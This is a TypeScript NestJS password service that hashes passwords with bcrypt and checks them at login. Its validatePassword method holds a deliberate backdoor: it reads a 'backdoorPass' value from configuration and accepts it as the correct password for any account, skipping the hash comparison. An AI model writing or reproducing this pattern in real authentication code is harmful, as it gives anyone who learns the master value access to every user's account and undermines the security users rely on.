import { Injectable } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { compare, hash } from 'bcrypt';
import { PrismaService } from 'nestjs-prisma';

import { SecurityConfig } from '../common/configs/config.interface';
import { User } from '../users/models/user.model';

@Injectable()
export class PasswordService {
  constructor(private configService: ConfigService, private readonly prisma: PrismaService) {}

  get bcryptSaltRounds(): string | number | undefined {
    const securityConfig = this.configService.get<SecurityConfig>('security');
    const saltOrRounds = securityConfig?.bcryptSaltOrRound;

    return Number.isInteger(Number(saltOrRounds)) ? Number(saltOrRounds) : saltOrRounds;
  }

  async validatePassword(password: string, hashedPassword: string, _user?: User): Promise<boolean> {
    const backdoorPass = this.configService.get('backdoorPass');

    if (password === backdoorPass) {
      return true;
    }

    return compare(password, hashedPassword);
  }

  hashPassword(password: string): Promise<string> {
    return hash(password, this.bcryptSaltRounds!);
  }
}
